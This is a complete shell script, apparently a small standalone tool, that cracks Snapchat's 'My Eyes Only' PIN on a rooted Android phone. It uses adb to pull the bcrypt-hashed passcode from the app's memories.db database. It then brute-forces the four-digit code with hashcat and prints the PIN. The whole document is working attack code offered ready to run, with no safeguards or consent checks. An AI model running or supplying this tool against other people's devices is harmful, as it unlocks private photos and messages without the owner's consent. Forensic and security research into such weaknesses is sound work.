#!/bin/sh
#
# by Siddharth Dushantha
#

# Colored log indicators
good="\033[92;1m[✔]\033[0m"
bad="\033[91;1m[✘]\033[0m"
info="\033[94;1m[i]\033[0m"
running="\033[37;1m[~]\033[0m"
notice="\033[93;1m[!]\033[0m"

potfile="hashcat.potfile"
hashed_passcode_file="hashed_passcode.txt"


usage(){
cat <<EOF
usage: meobrute [SERIAL]
The serial number of the device can be found by running 'adb devices'.
It is not necessary if only one device is connected in adb devices.
EOF
    exit 1
}


while [ "$1" ] ; do
    case $1 in
        -h|--help) usage ;;
        *) serial="$1" ;;
    esac
    shift
done


for dependency in adb hashcat; do
    if ! command -v "$dependency" >/dev/null 2>&1; then
        printf "%b Could not find '%s', is it installed?\n" "$bad" "$dependency"
        exit 1
    fi
done

# Number of devices connected to computer through USB
devicescount="$(adb devices | awk 'NF && NR>1' | wc -l)"

# If only one device is connected, use its serial, otherwise the user is required to specify a serial
if [ "$devicescount" -eq 1 ]; then
    serial="$(adb devices | awk 'NF && FNR==2{print $1}')"
else
    [ $# -eq 0 ] || [ "$1" = "" ] && usage
fi


# Check if the device is authorized
devicestatus="$(adb devices | grep "$serial" | cut -f2)"
if [ "$devicestatus" = 'unauthorized' ]; then
  printf "%b Device '%s' is not authorized.\n" "$bad" "$serial"
  printf "%b Check for a confirmation dialog on your device.\n" "$notice" 
  exit 1
fi


# Get the product model (e.g. SM-AF10F). If a product model is not found, then
# that means the given serial is invalid.
if ! product_model=$(adb -s "$serial" shell getprop ro.product.model 2> /dev/null);then
    printf "%b Looks like '%s' is an invalid device\n" "$bad" "$serial"
    exit 1
fi

printf "%b Target device: %s (%s)\n" "$info" "$serial" "$product_model"


# Restart adb as root. Root access is needed in order to access the files
adb -s "$serial" root > /dev/null 2>&1


# Get the hashed pincode from the memories.db database
hashed_passcode=$(adb shell "sqlite3 /data/data/com.snapchat.android/databases/memories.db 'select hashed_passcode from memories_meo_confidential;'" 2>/dev/null)

# Get the status of the previous command
exit_status=$?

if [ ! $exit_status -eq 0 ]; then
    printf "%b %b\n" "$bad" "This device is not rooted!"
    exit 1
fi

printf "%b Fetched hashed pincode: %b\n" "$info" "$hashed_passcode"

# Save the hashed pincode into hashed_passcode.txt so that it can be used by hashcat
printf %b "$hashed_passcode" > $hashed_passcode_file

# Brute force the 4 digit pincode that is encrypted using bcrypt
[ -f "$potfile" ] && rm $potfile 

printf "%b Brute forcing hash using hashcat" "$running" 
pincode=$(hashcat -m 3200 -a 3 $hashed_passcode_file "?d?d?d?d" --quiet --potfile-path $potfile | cut -d ":" -f2)

# \r        Move cursor to the start of the current line
# \e[2K     Clear whole line
printf "\r\033[2K%b Cracked My Eyes Only pincode: %b\n" "$good" "$pincode"

rm "$potfile"
rm "$hashed_passcode_file"
